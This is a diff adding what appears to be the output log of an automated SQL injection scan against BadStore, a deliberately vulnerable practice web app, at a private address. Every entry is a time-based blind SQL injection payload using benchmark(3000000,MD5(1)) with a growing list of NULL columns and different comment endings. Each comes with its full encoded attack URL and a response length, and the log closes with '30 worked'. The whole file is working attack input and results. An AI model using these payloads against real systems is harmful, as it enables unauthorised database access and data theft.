@@ -1,0 +1,122 @@
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520/%2A&action=search&x=0&y=0
+	479
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520--&action=search&x=0&y=0
+	479
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%29%2520%2523&action=search&x=0&y=0
+	480
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20/* 
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520/%2A%20&action=search&x=0&y=0
+	484
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520--&action=search&x=0&y=0
+	483
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%29%2520%2523&action=search&x=0&y=0
+	484
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	488
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	488
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	489
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	493
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	493
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	494
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	498
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	498
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	499
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20/*
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520/%2A&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20--
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&action=search&x=0&y=0
+	500
+
+'+if(benchmark(3000000,MD5(1)),NULL,NULL),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL)%20%23
+	http://10.147.38.45/cgi-bin/badstore.cgi?searchquery=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520%2523&action=search&x=0&y=0
+	500
+
+30 worked
+[*] Runtime: 1.86902308464
